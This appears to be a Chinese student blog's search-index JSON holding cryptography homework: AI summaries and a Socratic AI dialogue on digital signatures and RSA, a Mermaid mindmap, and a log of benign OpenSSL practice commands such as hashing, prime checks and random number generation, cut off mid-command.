[{"categories":["homework"],"content":"[toc] 第五周预习报告\r","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:0:0","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习内容\r学习内容 《Windows C/C++加密解密实战》第 7 章 课程 mindmap 报告内容参考第⼀周 ","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:0","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"AI对学习内容的总结\r要求\r让AI（kimi，元宝等）阅读学习内容并进⾏总结，教材内容可以使⽤微信读书或者云班课电⼦教材 总结\r《windows C/C++加密解密实战》第 7 章\r这份PDF文件是关于数字签名技术的实战指南，主要内容包括： 数字签名技术概述：介绍了互联网信息安全的重要性，以及数字签名技术在保障数据传输保密性、完整性和真实性方面的作用。 RSA公钥算法：讨论了RSA算法的历史、安全性和在数字签名中的应用。提到了随着攻击方式的发展，RSA密钥长度的增加对于提高安全性的重要性。 数字签名的基本概念：解释了数字签名的五个特性：可信性、不可伪造性、不可重用性、不可改变性和不可抵赖性。 数字签名的原理和定义：描述了数字签名的生成和验证过程，以及数字签名方案的三个组成部分：密钥生成算法、签名生成算法和签名验证算法。 数字签名的分类：根据数学难题、密码体制和特殊用途对数字签名进行了分类，包括基于离散对数、素因子分解、椭圆曲线等数学难题的签名方案，以及对称密钥和非对称密钥密码体制的签名方案。 数字签名的安全性：探讨了数字签名安全性的评估、证明和攻击分析方法。 数字签名的特征与应用：强调了数字签名在电子商务、网络安全通信等领域的重要性，并提出了一个优秀的数字签名应具备的特征。 RSA公钥算法在数字签名中的应用：详细介绍了RSA算法在数字签名中的具体应用，包括参数选择、密钥生成、签名和验证过程。 基于OpenSSL的签名验签编程：提供了使用OpenSSL库进行数字签名和验签的编程示例，包括直接使用RSA函数和使用EVP系列函数两种方法。 学习总结： 数字签名技术是网络安全中的一个重要组成部分，它通过密码学方法确保了信息传输的安全性和真实性。RSA算法作为数字签名的核心技术之一，虽然面临着密钥长度增加带来的性能挑战，但仍然是目前最广泛使用的公钥加密算法之一。 数字签名不仅需要保证消息的完整性和发送者的身份验证，还要防止消息被篡改和抵赖。随着网络攻击手段的不断进化，数字签名技术也在不断地发展和完善，以适应新的安全需求。 在实际应用中，数字签名通常结合哈希函数和公钥加密技术来实现。OpenSSL作为一个功能强大的密码学库，提供了丰富的API来支持数字签名的生成和验证，使得开发者可以方便地在自己的应用程序中实现数字签名功能。 通过学习这份PDF文件，我们可以了解到数字签名技术的基本概念、原理和应用，以及如何在实际编程中使用OpenSSL库来实现数字签名和验签。这些知识对于从事网络安全、电子商务和信息安全领域的开发者来说是非常宝贵的。 ","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:1","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"对AI总结的反思\r要求\rAI总结的问题 反思\rAI总结比较精简，适合作为提纲、导图等方式指导学习，更有助于分配自己的学习时间和精力 ","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:2","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习思维导图\r要求\rMermaid 代码与截图(参考Mermaid MindMap语法)或者提交思维导图链接（如果使用线上编辑器，推荐processon,xmind,…） 思维导图\r代码: mindmap root(数字签名技术) sub章1(数字签名概述) sub节1_1(互联网信息安全重要性) 详细1_1_1(网络攻击方法层出不穷) 详细1_1_2(信息安全性与防御性脆弱) sub节1_2(密码学在网络安全中的作用) 详细1_2_1(保障数据传输的保密性与完整性) 详细1_2_2(实现传输实体的真实性与不可否认性) sub章2(RSA公钥算法) sub节2_1(RSA算法概述) 详细2_1_1(基于大素数的公钥加密系统) 详细2_1_2(非对称加密，使用公钥加密，私钥解密) sub节2_2(密钥生成) 详细2_2_1(选择两个大素数p和q) 详细2_2_2(计算n = p*q和φ(n) = (p-1)(q-1)) 详细2_2_3(选择e，使得1 \u003c e \u003c φ(n)且gcd(e, φ(n)) = 1) 详细2_2_4(计算d，使得d*e ≡ 1 (mod φ(n))) sub节2_3(RSA安全性) 详细2_3_1(密钥长度与安全性的关系) 详细2_3_2(攻击方式对RSA安全性的影响) sub章3(数字签名基础) sub节3_1(数字签名定义) 详细3_1_1(模拟手写签名的电子形式) 详细3_1_2(保证电子信息的来源认证和完整性) sub节3_2(数字签名特性) 详细3_2_1(不可抵赖性) 详细3_2_2(不可伪造性) 详细3_2_3(可仲裁性) sub章4(数字签名原理与分类) sub节4_1(数字签名原理) 详细4_1_1(密钥生成算法) 详细4_1_2(签名生成算法) 详细4_1_3(签名验证算法) sub节4_2(数字签名分类) 详细4_2_1(基于数学难题的分类) 详细4_2_2(基于密码体制的分类) 详细4_2_3(基于特殊用途的分类) sub章5(数字签名安全性与应用) sub节5_1(安全性评估与证明) 详细5_1_1(安全性评估) 详细5_1_2(安全性证明) sub节5_2(数字签名应用) 详细5_2_1(电子商务) 详细5_2_2(网络安全通信) sub章6(RSA在数字签名中的应用) sub节6_1(签名与验证过程) 详细6_1_1(消息摘要的生成) 详细6_1_2(密钥的生成) 详细6_1_3(消息签名) 详细6_1_4(消息验证) sub节6_2(使用Hash函数优化) 详细6_2_1(对消息进行Hash变换) 详细6_2_2(签名摘要值) sub章7(基于OpenSSL的签名验签编程) sub节7_1(直接使用RSA函数) 详细7_1_1(RSA_sign函数) 详细7_1_2(RSA_verify函数) sub节7_2(使用EVP系列函数) 详细7_2_1(EVP_SignInit_ex) 详细7_2_2(EVP_SignUpdate) 详细7_2_3(EVP_SignFinal) 详细7_2_4(EVP_VerifyInit_ex) 详细7_2_5(EVP_VerifyUpdate) 详细7_2_6(EVP_VerifyFinal)mindmap\rroot(数字签名技术)\rsub章1(数字签名概述)\rsub节1_1(网络信息安全重要性)\r详细1_1_1(网络攻击方法层出不穷)\r详细1_1_2(信息安全性与防御性脆弱)\rsub节1_2(数字签名的作用)\r详细1_2_1(保障数据传输的保密性与完整性)\r详细1_2_2(确保传输服务的可用性与实体的真实性)\rsub章2(RSA公钥算法)\rsub节2_1(RSA算法特点)\r详细2_1_1(公钥与私钥组成)\r详细2_1_2(抵御大多数恶意攻击)\rsub节2_2(RSA算法安全性)\r详细2_2_1(密钥位数提高保障安全性)\r详细2_2_2(提高密钥位数增加计算复杂性)\rsub章3(数字签名技术)\rsub节3_1(数字签名特性)\r详细3_1_1(可信性)\r详细3_1_2(不可伪造性)\r详细3_1_3(不可重用性)\r详细3_1_4(不可改变性)\r详细3_1_5(不可抵赖性)\rsub节3_2(数字签名原理)\r详细3_2_1(私钥签名与公钥验证)\r详细3_2_2(确保信息的完整性与有效性)\rsub章4(数字签名的分类)\rsub节4_1(基于数学难题的分类)\r详细4_1_1(离散对数问题)\r详细4_1_2(素因子分解问题)\r详细4_1_3(椭圆曲线数字签名)\rsub节4_2(基于密码体制的分类)\r详细4_2_1(对称密钥密码体制)\r详细4_2_2(非对称密钥密码体制)\rsub章5(数字签名的安全性)\rsub节5_1(安全性评估)\r详细5_1_1(设计者对方案的密码分析)\rsub节5_2(安全性证明)\r详细5_2_1(基于随机应答模型与标准模型)\rsub节5_3(攻击分析)\r详细5_3_1(分析已知方案的安全性缺陷)\rsub章6(数字签名的特征与应用)\rsub节6_1(数字签名特征)\r详细6_1_1(发送方不可否认)\r详细6_1_2(接收方可确认并证实)\rsub节6_2(数字签名应用)\r详细6_2_1(电子商务)\r详细6_2_2(网络安全通信)\rsub章7(RSA在数字签名中的应用)\rsub节7_1(参数选择和密钥生成)\r详细7_1_1(选择大素数p和q)\rsub节7_2(签名与验证过程)\r详细7_2_1(使用私钥签名)\r详细7_2_2(使用公钥验证)\rsub章8(基于OpenSSL的签名验签编程)\rsub节8_1(直接使用RSA函数)\r详细8_1_1(RSA_sign与RSA_verify)\rsub节8_2(使用EVP系列函数)\r详细8_2_1(EVP_SignInit_ex与EVP_SignFinal)\r详细8_2_2(EVP_VerifyInit_ex与EVP_VerifyFinal)\rmindmap\rroot(数字签名技术)\rsub章1(数字签名概述)\rsub节1_1(网络信息安全重要性)\r详细1_1_1(网络攻击方法层出不穷)\r详细1_1_2(信息安全性与防御性脆弱)\rsub节1_2(数字签名的作用)\r详细1_2_1(保障数据传输的保密性与完整性)\r详细1_2_2(确保传输服务的可用性与实体的真实性)\rsub章2(RSA公钥算法)\rsub节2_1(RSA算法特点)\r详细2_1_1(公钥与私钥组成)\r详细2_1_2(抵御大多数恶意攻击)\rsub节2_2(RSA算法安全性)\r详细2_2_1(密钥位数提高保障安全性)\r详细2_2_2(提高密钥位数增加计算复杂性)\rsub章3(数字签名技术)\rsub节3_1(数字签名特性)\r详细3_1_1(可信性)\r详细3_1_2(不可伪造性)\r详细3_1_3(不可重用性)\r详细3_1_4(不可改变性)\r详细3_1_5(不可抵赖性)\rsub节3_2(数字签名原理)\r详细3_2_1(私钥签名与公钥验证)\r详细3_2_2(确保信息的完整性与有效性)\rsub章4(数字签名的分类)\rsub节4_1(基于数学难题的分类)\r详细4_1_1(离散对数问题)\r详细4_1_2(素因子分解问题)\r详细4_1_3(椭圆曲线数字签名)\rsub节4_2(基于密码体制的分类)\r详细4_2_1(对称密钥密码体制)\r详细4_2_2(非对称密钥密码体制)\rsub章5(数字签名的安全性)\rsub节5_1(安全性评估)\r详细5_1_1(设计者对方案的密码分析)\rsub节5_2(安全性证明)\r详细5_2_1(基于随机应答模型与标准模型)\rsub节5_3(攻击分析)\r详细5_3_1(分析已知方案的安全性缺陷)\rsub章6(数字签名的特征与应用)\rsub节6_1(数字签名特征)\r详细6_1_1(发送方不可否认)\r详细6_1_2(接收方可确认并证实)\rsub节6_2(数字签名应用)\r详细6_2_1(电子商务)\r详细6_2_2(网络安全通信)\rsub章7(RSA在数字签名中的应用)\rsub节7_1(参数选择和密钥生成)\r详细7_1_1(选择大素数p和q)\rsub节7_2(签名与验证过程)\r详细7_2_1(使用私钥签名)\r详细7_2_2(使用公钥验证)\rsub章8(基于OpenSSL的签名验签编程)\rsub节8_1(直接使用RSA函数)\r详细8_1_1(RSA_sign与RSA_verify)\rsub节8_2(使用EVP系列函数)\r详细8_2_1(EVP_SignInit_ex与EVP_SignFinal)\r详细8_2_2(EVP_VerifyInit_ex与EVP_VerifyFinal)","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:3","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"基于AI的学习\r要求\r至少找到自己理解不是太好2个概念，让AI对自己进行苏格拉底提问 参考下面提示词或者使用AI Agent 提示词：“我在学习XXX知识点，请你以苏格拉底的方式对我进行提问，一次一个问题”\r1. 核心是要求AI工具：“请你以苏格拉底的方式对我进行提问”\r2. 然后AI工具就会给你提问，如果不知道问题的答案，可以反问AI：“你的理解（回答）是什么？”\r3. 如果你觉得差不多了，可以先问问AI工具：“针对我XXX知识点，我理解了吗？”\r4. AI工具会给出它的判断，如果你也觉得自己想清楚了，可以最后问AI工具：“我的回答结束了，请对我的回答进行评价总结”，让它帮你总结一下。学习内容\rHuman: 我在学习数字签名知识点，请你以苏格拉底的方式对我进行提问，一次一个问题AI: 当然可以，让我们开始吧。首先，你能告诉我你是如何理解“数字签名”这个概念的吗？Human: 数字签名是一种用于验证数字信息真实性和完整性的加密技术。它通常用于确保信息在传输过程中没有被篡改，并且确认信息的发送者确实是他们所声称的那个人。AI: 非常好，你已经抓住了数字签名的核心用途。那么，你能进一步解释一下数字签名是如何确保信息的“真实性”和“完整性”的吗？Human: 数字签名确保信息的“真实性”和“完整性”主要通过以下几个步骤实现：\r真实性\r私钥签名：发送者使用自己的私钥对信息的哈希值进行加密，生成数字签名。私钥是只有发送者知道的，因此这个过程可以证明信息是由持有相应私钥的发送者签名的。\r公钥验证：接收者使用发送者的公钥来解密数字签名，得到原始的哈希值。公钥是公开的，任何人都可以获取。\r对比哈希值：接收者对收到的信息再次进行哈希处理，得到一个新的哈希值。然后，将这个新的哈希值与使用公钥解密得到的哈希值进行比较。\r确认真实性：如果两个哈希值相同，说明信息在传输过程中没有被篡改，且确实是由声称的发送者发送的，因为只有发送者拥有对应的私钥来生成签名。\r完整性\r哈希函数：在数字签名过程中，首先对原始信息进行哈希处理。哈希函数是一种单向函数，它可以将任意长度的输入转换成固定长度的输出，且对于不同的输入，输出的哈希值几乎不可能相同。\r敏感性：哈希值对原始信息非常敏感，即使信息发生微小的变化，哈希值也会发生显著的变化。这意味着任何对信息的篡改都会导致哈希值的变化。\r签名与哈希值绑定：发送者对信息的哈希值进行签名，而不是对整个信息进行加密。这样，数字签名就与信息的哈希值绑定在一起。\r验证哈希值：当接收者收到信息和数字签名时，他们会对信息进行哈希处理，并使用发送者的公钥来验证数字签名。如果哈希值匹配，说明信息在传输过程中没有被篡改，从而确保了信息的完整性。\r通过这种方式，数字签名不仅能够验证信息的来源，还能够确保信息在传输过程中的完整性。如果有人试图篡改信息，接收者将无法验证数字签名，因为篡改后的信息的哈希值将与数字签名中的哈希值不匹配。这样，数字签名为信息的传输提供了一种安全保障。AI: 你的解释非常清晰。现在，让我们探讨一下数字签名中的“非对称加密”概念。你能描述一下什么是非对称加密，以及它在数字签名中扮演什么角色吗？Human: 非对称加密，也称为公钥加密，是一种加密方法，它使用一对密钥：一个公钥和一个私钥。这对密钥在数学上是相关的，但一个密钥不能从另一个密钥中推导出来。AI: 正确，非对称加密的确是基于一对密钥，一个用于加密（公钥），另一个用于解密（私钥）。那么，你能进一步解释一下在数字签名中，这两者是如何协同工作的吗？特别是私钥和公钥在签名和验证过程中各自承担的角色。Human: 私钥：在签名过程中用于加密哈希值，确保信息的真实性和防止伪造。\r公钥：在验证过程中用于解密数字签名，验证签名的有效性并确保非否认性。AI: 非常好，你已经理解了非对称加密在数字签名中的基本应用。现在，让我们深入一点。在数字签名的上下文中，如果有人试图篡改已经签名的信息，会发生什么？接收者如何发现这种篡改？Human: 会导致验签失败AI： 正是如此。如果信息被篡改，接收者在验证过程中会发现原始信息的哈希值与数字签名中的哈希值不匹配，从而导致验签失败。这证明了数字签名确保了信息的完整性。 现在，让我们换个角度思考：数字签名技术是否只能用于确保信息的完整性和真实性？还是它也能提供其他类型的安全保障？你能想到数字签名还能提供哪些额外的安全特性吗？Human： 数字签名还能提供抗抵赖性、数据源认证、时间戳和不可否认性等安全特性。AI： 没错，数字签名确实能提供这些额外的安全特性。那么，让我们进一步探讨一下抗抵赖性。你能解释一下什么是抗抵赖性，以及数字签名是如何实现这一特性的吗？Human： 私钥签名，只有持有私钥的人才能签名AI： 对的，抗抵赖性（Non-repudiation）意味着一旦签名被验证为有效，签名者就不能否认他们签署了该信息。这是因为私钥是唯一能够生成有效签名的密钥，而私钥理论上只有签名者自己才能访问。Human： 针对我数字签名的知识点，我了解的怎么样AI： 根据你之前的回答，你对数字签名的知识点有一个很好的理解。你已经掌握了数字签名的核心概念，包括： 数字签名的基本作用：确保信息传输的真实性和完整性。 非对称加密：理解了公钥和私钥在加密和解密中的作用。 签名和验证过程：清楚地描述了私钥用于签名，公钥用于验证的过程。 抗抵赖性：理解了数字签名如何提供抗抵赖性，确保发送者不能否认他们签署了信息。 密钥生成：虽然你还没有详细描述RSA密钥生成的具体步骤，但你已经知道它涉及到公钥和私钥的生成。 总的来说，你已经对数字签名技术有了相当扎实的理解。如果你能够进一步详细描述RSA密钥生成的具体步骤，包括选择两个大素数、计算模数和欧拉函数的值、选择公钥指数和计算私钥指数，那么你的理解将更加全面。","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:4","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习实践过程遇到的问题与解决方式（AI 驱动，优先使用AI工具解决问题）\rQ:量子计算的安全性是如何保证的 A: 量子计算的安全性是一个复杂的话题，因为它涉及到量子力学的原理以及量子计算机的能力。量子计算机利用量子比特（qubits）来处理信息，这使得它们在处理某些类型的问题上比传统计算机更加高效。然而，这种强大的计算能力也引发了对现有加密方法安全性的担忧，尤其是那些基于数学难题的公钥加密系统，比如RSA。 以下是一些关于量子计算安全性的关键点： 量子计算机的威胁： 量子计算机能够快速解决某些传统计算机难以解决的问题，比如大整数分解（这是RSA加密安全性的基础）。 量子计算机可以执行Grover算法，它能够加速无序数据库搜索问题的解决，这意味着它们可能更快地破解哈希函数。 量子加密： 量子密钥分发（QKD）是一种利用量子力学原理来安全地分发密钥的方法。它允许两个通信方产生和共享一个安全的随机密钥，即使有窃听者也无法无懈可击地窃取密钥信息。 量子密钥分发的安全性基于量子力学的基本原理，如不可克隆定理和测不准原理。 量子随机数生成： 量子过程的随机性可以用来生成真正的随机数，这对于加密密钥的生成至关重要。 量子计算机的限制： 尽管量子计算机在理论上具有强大的计算能力，但目前它们还处于发展的早期阶段，存在许多实际限制，如量子比特的稳定性（量子比特容易受到外界干扰而失去量子状态）和错误率。 后量子密码学： 为了应对量子计算机可能带来的威胁，研究人员正在开发后量子密码学算法，这些算法即使在量子计算机面前也能保持安全。这些算法通常基于量子计算机难以解决的数学问题，如格基问题和多变量二次方程问题。 量子计算的监管和标准： 随着量子计算技术的发展，相关的安全标准和法规也在不断发展，以确保量子计算的安全使用。 总的来说，量子计算的安全性是一个动态发展的领域，它需要不断地适应量子计算技术的进步，并开发新的加密方法来保护信息安全。 ","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:5","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"作业提交要求\r提交Markdown文件,文档命名“学号姓名《密码系统设计》.md” . 提交Markdown文件转为 PDF,文档命名“学号姓名《密码系统设计》第 X 周.pdf” 提交代码托管链接（可选）：学号姓名 gitee(github) 链接 内容质量高有加分 参考链接： AI工具 ChatGPT Kimi.ai - 帮你看更大的世界 (moonshot.cn) 图书 《Window C/C++加密解密实战》 ","date":"2024-10-13","objectID":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:6","tags":[null],"title":"第五周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%94%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"《密码系统设计》实验\r","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:0:0","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"实验项目\r实验序号 实验名称 实验学时数 实验目的 实验内容 实验类型 学生学习预期成果 实验一 嵌入式开发基础 6 掌握Linux系统使用与开发方法 Linux命令，OpenSSL（GmSSL）命令与开发 验证性 1.掌握常见的Linux命令与C语言开发方法；2.掌握OpenSSL（GmSSL）的基本用法与开发；3.掌握常见商用密码算法的使用 ","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:0","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"参考云班课相关教学视频，在 Ubuntu或openEuler中（推荐 openEuler）中实践课程思维导图中OpenSSL相关内容，使用Markdown记录详细记录实践过程，每完成一项git commit 一次。（5分）\ropenssl cmd\r[root@localhost roc-exp]# openssl version OpenSSL 3.3.2 3 Sep 2024 (Library: OpenSSL 3.3.2 3 Sep 2024)","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:1","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"openssl list -help\r[root@localhost roc-exp]# openssl -help help: Standard commands asn1parse ca ciphers cmp cms crl crl2pkcs7 dgst dhparam dsa dsaparam ec ecparam enc engine errstr fipsinstall gendsa genpkey genrsa help info kdf list mac nseq ocsp passwd pkcs12 pkcs7 pkcs8 pkey pkeyparam pkeyutl prime rand rehash req rsa rsautl s_client s_server s_time sess_id smime speed spkac srp storeutl ts verify version x509 Message Digest commands (see the `dgst' command for more details) blake2b512 blake2s256 md4 md5 mdc2 rmd160 sha1 sha224 sha256 sha3-224 sha3-256 sha3-384 sha3-512 sha384 sha512 sha512-224 sha512-256 shake128 shake256 sm3 Cipher commands (see the `enc' command for more details) aes-128-cbc aes-128-ecb aes-192-cbc aes-192-ecb aes-256-cbc aes-256-ecb aria-128-cbc aria-128-cfb aria-128-cfb1 aria-128-cfb8 aria-128-ctr aria-128-ecb aria-128-ofb aria-192-cbc aria-192-cfb aria-192-cfb1 aria-192-cfb8 aria-192-ctr aria-192-ecb aria-192-ofb aria-256-cbc aria-256-cfb aria-256-cfb1 aria-256-cfb8 aria-256-ctr aria-256-ecb aria-256-ofb base64 bf bf-cbc bf-cfb bf-ecb bf-ofb camellia-128-cbc camellia-128-ecb camellia-192-cbc camellia-192-ecb camellia-256-cbc camellia-256-ecb cast cast-cbc cast5-cbc cast5-cfb cast5-ecb cast5-ofb des des-cbc des-cfb des-ecb des-ede des-ede-cbc des-ede-cfb des-ede-ofb des-ede3 des-ede3-cbc des-ede3-cfb des-ede3-ofb des-ofb des3 desx idea idea-cbc idea-cfb idea-ecb idea-ofb rc2 rc2-40-cbc rc2-64-cbc rc2-cbc rc2-cfb rc2-ecb rc2-ofb rc4 rc4-40 seed seed-cbc seed-cfb seed-ecb seed-ofb sm4-cbc sm4-cfb sm4-ctr sm4-ecb sm4-ofb zlib [root@localhost roc-exp]# openssl list -help Usage: list [options] General options: -help Display this summary Output options: -1 List in one column -verbose Verbose listing -select val Select a single algorithm -commands List of standard commands -standard-commands List of standard commands -all-algorithms List of all algorithms -digest-commands List of message digest commands (deprecated) -digest-algorithms List of message digest algorithms -kdf-algorithms List of key derivation and pseudo random function algorithms -random-instances List the primary, public and private random number generator details -random-generators List of random number generators -mac-algorithms List of message authentication code algorithms -cipher-commands List of cipher commands (deprecated) -cipher-algorithms List of symmetric cipher algorithms -encoders List of encoding methods -decoders List of decoding methods -key-managers List of key managers -key-exchange-algorithms List of key exchange algorithms -kem-algorithms List of key encapsulation mechanism algorithms -signature-algorithms List of signature algorithms -asymcipher-algorithms List of asymmetric cipher algorithms -public-key-algorithms List of public key algorithms -public-key-methods List of public key methods -store-loaders List of store loaders -providers List of provider information -engines List of loaded engines -disabled List of disabled features -options val List options for specified command -objects List built in objects (OID\u003c-\u003ename mappings) Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:2","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"openssl -help\r[root@localhost roc-exp]# openssl -help help: Standard commands asn1parse ca ciphers cmp cms crl crl2pkcs7 dgst dhparam dsa dsaparam ec ecparam enc engine errstr fipsinstall gendsa genpkey genrsa help info kdf list mac nseq ocsp passwd pkcs12 pkcs7 pkcs8 pkey pkeyparam pkeyutl prime rand rehash req rsa rsautl s_client s_server s_time sess_id smime speed spkac srp storeutl ts verify version x509 Message Digest commands (see the `dgst' command for more details) blake2b512 blake2s256 md4 md5 mdc2 rmd160 sha1 sha224 sha256 sha3-224 sha3-256 sha3-384 sha3-512 sha384 sha512 sha512-224 sha512-256 shake128 shake256 sm3 Cipher commands (see the `enc' command for more details) aes-128-cbc aes-128-ecb aes-192-cbc aes-192-ecb aes-256-cbc aes-256-ecb aria-128-cbc aria-128-cfb aria-128-cfb1 aria-128-cfb8 aria-128-ctr aria-128-ecb aria-128-ofb aria-192-cbc aria-192-cfb aria-192-cfb1 aria-192-cfb8 aria-192-ctr aria-192-ecb aria-192-ofb aria-256-cbc aria-256-cfb aria-256-cfb1 aria-256-cfb8 aria-256-ctr aria-256-ecb aria-256-ofb base64 bf bf-cbc bf-cfb bf-ecb bf-ofb camellia-128-cbc camellia-128-ecb camellia-192-cbc camellia-192-ecb camellia-256-cbc camellia-256-ecb cast cast-cbc cast5-cbc cast5-cfb cast5-ecb cast5-ofb des des-cbc des-cfb des-ecb des-ede des-ede-cbc des-ede-cfb des-ede-ofb des-ede3 des-ede3-cbc des-ede3-cfb des-ede3-ofb des-ofb des3 desx idea idea-cbc idea-cfb idea-ecb idea-ofb rc2 rc2-40-cbc rc2-64-cbc rc2-cbc rc2-cfb rc2-ecb rc2-ofb rc4 rc4-40 seed seed-cbc seed-cfb seed-ecb seed-ofb sm4-cbc sm4-cfb sm4-ctr sm4-ecb sm4-ofb zlib","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:3","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"数据输入输出\r文本\r[root@localhost roc-exp]# echo 123 | openssl sm3 SM3(stdin)= e95001aed4b6f7de59169913997dace404f05091ed49c37133a9950a69405a9c [root@localhost roc-exp]# echo \"123\" | openssl sm3 SM3(stdin)= e95001aed4b6f7de59169913997dace404f05091ed49c37133a9950a69405a9c二进制 -file 通用选项\r[root@localhost roc-exp]# echo \"obase=16;123\" | bc 7B [root@localhost roc-exp]# echo -n -e \"\\x7B\" \u003e 123.bin [root@localhost roc-exp]# od -tx1 123.bin 0000000 7b 0000001 [root@localhost roc-exp]# openssl sm3 -file 123.bin SM3(123.bin)= 2ed59fea0dbe4e4f02de67ee657eb6be8e22a7db425103402d8a36d7b6f6d344 [root@localhost roc-exp]# echo -ne \"\\x7B\" | openssl sm3 SM3(stdin)= 2ed59fea0dbe4e4f02de67ee657eb6be8e22a7db425103402d8a36d7b6f6d344","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:4","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"prime\rhelp\r[root@localhost roc-exp]# openssl prime -help Usage: prime [options] [number...] General options: -help Display this summary -bits +int Size of number in bits -checks +int Number of checks Output options: -hex Hex output -generate Generate a prime -safe When used with -generate, generate a safe prime Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms Parameters: number Number(s) to check for primality if not generating素性检查\r[root@localhost roc-exp]# openssl prime 3 3 (3) is prime [root@localhost roc-exp]# openssl prime 33 21 (33) is not prime [root@localhost roc-exp]# openssl prime -checks 10 33 21 (33) is not prime [root@localhost roc-exp]# openssl prime -hex 4F 4F (4F) is prime素数生成\r[root@localhost roc-exp]# openssl prime -generate -bits 10 907 [root@localhost roc-exp]# openssl prime 907 38B (907) is prime [root@localhost roc-exp]# openssl prime -generate -bits 10 929 [root@localhost roc-exp]# openssl prime 929 3A1 (929) is prime [root@localhost roc-exp]# openssl prime -generate -bits 10 -hex 038B [root@localhost roc-exp]# openssl prime -hex 038B 38B (038B) is prime","date":"2024-10-13","objectID":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/:1:5","tags":[null],"title":"实验1-1","uri":"/posts/homework/%E5%AE%9E%E9%AA%8C1-1/"},{"categories":["homework"],"content":"rand\rhelp\r[root@localhost roc-exp]# openssl rand -help Usage: rand [options] num[K|M|G|T] General options: -help Display this summary -engine val Use engine, possibly a hardware device Output options: -out outfile Output file -base64 Base64 encode output -hex Hex encode output Random state options: -rand val Load the given file(s) into the random number generator -writerand outfile Write random data to the specified file Provider options: -provider-path val Provider load path (must be before 'provider' argument if required) -provider val Provider to load (can be specified multiple times) -propquery val Property query used when fetching algorithms Parameters: num Number of bytes to generate随机数产生\r[root@localhost roc-exp]# openssl rand 10 ¢¶Խc [root@localhost roc-exp]# openssl rand 10 | od -tx1 0000000 60 7d 0c c3 c4 ba 9d 56 39 88 0000012 [root@localhost roc-exp]# openssl rand 10 | xxd -p a1cb9bfff4f9cdfce5fe [root@localhost roc-exp]# openssl rand -hex 10 9916bb1ea1b24825598d [root@localhost roc-exp]# openssl rand -base64 10 iAXI4KNa9ZgXwA==随机数文件\r[root@localhost roc-exp]# openssl rand -out r1.bin 10 [root@localhost roc-exp]# od 